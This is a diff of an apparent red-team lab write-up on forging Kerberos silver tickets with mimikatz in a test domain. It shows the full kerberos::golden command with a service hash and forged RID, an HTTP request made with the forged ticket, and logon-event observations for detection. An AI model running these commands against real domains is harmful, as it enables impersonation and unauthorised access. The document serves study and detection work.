@@ -24,9 +24,13 @@ Below is a table with values supplied to mimikatz explained and the command itse
 | /id:1155 | Forging user's RID |
 | /ptt | Instructs mimikatz to inject the forged ticket to memory to make it usable immediately |
 
+{% code-tabs %}
+{% code-tabs-item title="attacker@victim" %}
 ```csharp
 mimikatz # kerberos::golden /sid:S-1-5-21-4172452648-1021989953-2368502130-1105 /domain:offense.local /ptt /id:1155 /target:dc-mantvydas.offense.local /service:http /rc4:a87f3a337d73085c45f9416be5787d86 /user:beningnadmin
 ```
+{% endcode-tabs-item %}
+{% endcode-tabs %}
 
 ![Getting a user&apos;s SID](../../.gitbook/assets/silver-tickets-whoami.png)
 
@@ -46,7 +50,21 @@ Note in the above mimikatz window the Group IDs which the fake user `benignadmin
 
 ![](../../.gitbook/assets/silver-tickets-groups.png)
 
+Initiating a request to the attacked service with a TGS ticket:
+
+{% code-tabs %}
+{% code-tabs-item title="attacker@victim" %}
 ```csharp
 Invoke-WebRequest -UseBasicParsing -UseDefaultCredentials http://dc-mantvydas.offense.local
 ```
+{% endcode-tabs-item %}
+{% endcode-tabs %}
+
+![](../../.gitbook/assets/silver-tickets-httprequest.png)
+
+## Observations
+
+Note a network logon from `benignadmin` as well as forged RIDs:
+
+![](../../.gitbook/assets/silver-tickets-4624%20%281%29.png)
 
